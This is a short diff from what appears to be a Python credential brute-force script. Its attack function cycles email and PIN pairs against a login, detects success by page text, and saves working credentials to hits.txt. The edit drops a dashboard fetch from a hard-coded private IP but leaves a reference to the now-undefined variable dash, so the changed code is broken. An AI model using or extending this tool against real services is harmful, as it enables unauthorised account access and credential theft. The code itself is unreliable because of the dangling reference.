@@ -23,8 +23,7 @@ def attack(url, email, pin, delay, verbose):
                 print(f"[~] Attempts: {attempts} | Current: {email}:{pin}")
 
         if response.status_code != 500:
-            dash = session.get("http://192.168.1.218:5000/dashboard")
-            if "Welcome" in dash.text or "Logout" in dash.text or email.split('@')[0] in dash.text:
+            if "Welcome" in response.text or "Logout" in response.text or email.split('@')[0] in dash.text:
                 print(f"[+] SUCCESS: {email}:{pin}")
                 with open("hits.txt", "a") as f:
                     f.write(f"{email}:{pin}\n")
